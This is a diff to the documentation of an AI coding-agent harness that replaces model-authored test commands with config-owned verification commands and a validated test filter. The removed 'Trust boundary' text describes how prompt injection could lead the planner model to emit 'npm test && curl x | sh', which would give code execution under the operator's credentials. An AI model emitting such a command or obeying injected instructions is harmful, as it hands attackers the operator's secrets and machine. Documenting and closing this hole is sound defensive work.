@@ -41,7 +41,7 @@ agent-harness status --run-id <id> --json
 agent-harness answer --run-id <id> --question <id> --text "..."
 agent-harness continue --run-id <id>
 agent-harness confirm-grill --run-id <id> [--feedback "..."]
-agent-harness confirm-verification --run-id <id> [--keep-current] [--test-command "..."]
+agent-harness confirm-verification --run-id <id> [--keep-current] [--verification-command "..."]
 agent-harness retry --run-id <id> [--force]
 agent-harness retry --run-id <id> --max-run-tokens <n> [--force]
 agent-harness retry --run-id <id> --max-run-cost-usd <n> [--force]
@@ -115,9 +115,9 @@ Operators can also add a **note** mid-interview ("don't touch the auth module") 
 
 When the griller returns `ready_to_plan`, the run pauses on an explicit **grill-complete gate** (`awaiting_input` with `grillReady`). The dashboard (or `agent-harness confirm-grill`) lets the operator continue into planning or send feedback that reopens grilling with a new fog unknown. Planning does not start until that confirmation.
 
-After grill confirmation and before the planner runs, a **verification settings gate** appears (`awaiting_input` with `verificationReady`). A tools-off `project-profiler` proposes `commands.test` and `workflow.testPathPatterns` from repository evidence; the operator must confirm or edit (optionally also writing project defaults) via the dashboard or `agent-harness confirm-verification` before planning continues.
+After grill confirmation and before the planner runs, a **verification settings gate** appears (`awaiting_input` with `verificationReady`). A tools-off `project-profiler` proposes the ordered `commands.verification` collection, optional config-owned `commands.testTargetTemplate`, and `workflow.testPathPatterns` from repository evidence; the operator must confirm or edit (optionally also writing project defaults) before planning continues.
 
-After verification settings are confirmed, the harness runs the confirmed `commands.test` once as a **verification baseline**. Exit 0 passes; greenfield runners that print “no tests found” / “no test files found” also pass. Real failures, launch errors, and timeouts open an `awaiting_input` gate (`verificationBaselineReady`) with command evidence. Retry via the dashboard or `agent-harness retry-verification-baseline` (optionally editing `commands.test`); the planner does not run until the baseline is acceptable.
+After verification settings are confirmed, the harness runs every confirmed `commands.verification` entry in order as a **verification baseline**. Exit 0 passes; greenfield runners that print “no tests found” / “no test files found” also pass. Real failures, launch errors, and timeouts open an `awaiting_input` gate (`verificationBaselineReady`) with command evidence. Retry via the dashboard or `agent-harness retry-verification-baseline` (optionally using `--verification-command`); the planner does not run until the baseline is acceptable.
 
 The **planner** then produces a **high-level plan** only (problem, solution, approach, constraints, out of scope) — not executable tickets. The run pauses on a **plan review gate** (`awaiting_input` with `planReady`). The dashboard (or `agent-harness confirm-plan`) lets the operator edit and approve the plan, or send feedback that discards it and re-plans. Approving continues on the same retained planner provider session to author a local **PRD** (`prd.md`), then a fresh **`issue-slicer`** agent turns that PRD into `BuildTasks` and optional `proposedInstalls`. There is no extra HITL after PRD or slicing; install approvals (when any) are the next pause before execution.
 
@@ -298,11 +298,11 @@ New runs (dashboard **Start from branch**, `POST /api/runs` `baseBranch`, or CLI
 
 ## Trust boundary
 
-The harness executes shell commands in the repository root with the operator's full environment — including secrets such as `CURSOR_API_KEY`. Most of those commands come from config (`commands.test`, `commands.gates[].command`). The exception is `task.testCommand`: the planner authors it, materialization copies it verbatim, and the targeted-test step runs it with `shell: true`. A planner induced (via prompt injection from a retrieved document or a repository file) to emit something like `npm test && curl x | sh` gets arbitrary code execution under the operator's credentials.
+The harness executes config-owned shell commands in the repository root with a minimal child-process environment. Full verification uses the ordered `commands.verification` collection. Per-task targeting uses only a validated `task.testFilter`, interpolated into the config-owned `commands.testTargetTemplate`; tasks cannot author shell commands.
 
-Mitigations available today: pin `workflow.tdd`, review planner output before execution, and run the harness in a container or VM when the repository or knowledge index may contain untrusted material.
+Keep verification configuration under review and run the harness in a container or VM when the repository or knowledge index may contain untrusted material.
 
-Intended fix (deferred — see [Command allowlisting for model-authored test targets](../../docs/roadmap.md#command-allowlisting-for-model-authored-test-targets)): allowlist `task.testCommand` against `config.commands.test` and `config.commands.gates[].command`, and model per-task targeting as a scoped `testFilter` argument interpolated into a config-owned template rather than as a free-form command string.
+This boundary is enforced by schema validation: verification commands originate in confirmed configuration, and test filters accept only the restricted identifier syntax used by supported test runners.
 
 ## Testing
 
